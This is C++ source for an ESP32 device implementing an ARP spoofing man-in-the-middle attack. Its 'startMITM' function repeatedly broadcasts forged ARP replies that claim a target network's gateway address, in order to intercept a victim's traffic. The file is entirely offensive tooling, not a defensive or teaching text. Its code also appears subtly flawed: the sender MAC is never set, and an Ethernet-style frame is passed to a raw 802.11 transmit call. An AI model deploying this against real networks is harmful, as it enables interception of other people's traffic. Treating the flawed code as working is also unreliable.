#include "arp_spoof.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <lwip/inet.h>
#include "mac_utils.h"
#include <esp_wifi.h>

namespace ARPSpoof {

typedef struct {
    uint8_t destMac[6];
    uint8_t sourceMac[6];
    uint16_t frameType;
    uint16_t hardwareType;
    uint16_t protocolType;
    uint8_t hardwareSize;
    uint8_t protocolSize;
    uint16_t opcode;
    uint8_t senderMac[6];
    uint32_t senderIP;
    uint8_t targetMac[6];
    uint32_t targetIP;
} __attribute__((packed)) ARPPacket;

static bool spoofing = false;
static uint32_t packetsSent = 0;

SpoofResult startMITM(const String &targetIP, const String &gatewayIP, uint16_t timeoutMs) {
    SpoofResult result{false, targetIP, gatewayIP, 0};

    if (!TxArm::isArmed()) {
        return result;
    }

    spoofing = true;
    packetsSent = 0;

    uint32_t target = inet_addr(targetIP.c_str());
    uint32_t gateway = inet_addr(gatewayIP.c_str());

    Serial.println("ARP Spoof started:");
    Serial.println("Target: " + targetIP);
    Serial.println("Gateway: " + gatewayIP);

    uint8_t sourceMac[6] = {0};
    String macStr = WiFi.macAddress();
    if (!MacUtils::parse(macStr, sourceMac)) {
        result.active = false;
        result.packetsSent = 0;
        return result;
    }

    uint32_t startTime = millis();
    uint32_t deadline = startTime + timeoutMs;

    while ((int32_t)(millis() - deadline) < 0 && spoofing && TxArm::isArmed()) {
        ARPPacket pkt;
        memset(&pkt, 0, sizeof(pkt));

        pkt.frameType = htons(0x0806);
        pkt.hardwareType = htons(1);
        pkt.protocolType = htons(0x0800);
        pkt.hardwareSize = 6;
        pkt.protocolSize = 4;
        pkt.opcode = htons(2);  // ARP reply

        memcpy(pkt.destMac, "\xff\xff\xff\xff\xff\xff", 6);
        memcpy(pkt.sourceMac, sourceMac, 6);

        pkt.senderIP = gateway;
        pkt.targetIP = target;

        // Send ARP packet via WiFi raw frame transmission
        esp_err_t txResult = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&pkt, sizeof(pkt), false);
        if (txResult == ESP_OK) {
            packetsSent++;
        } else {
            Serial.print("⚠ ARP TX error(0x" + String(txResult, 16) + ") ");
        }
        delay(100);
    }

    result.active = true;
    result.packetsSent = packetsSent;
    spoofing = false;

    Serial.println("ARP spoofing complete - " + String(packetsSent) + " packets sent");

    return result;
}

void stop() {
    spoofing = false;
}

} // namespace ARPSpoof
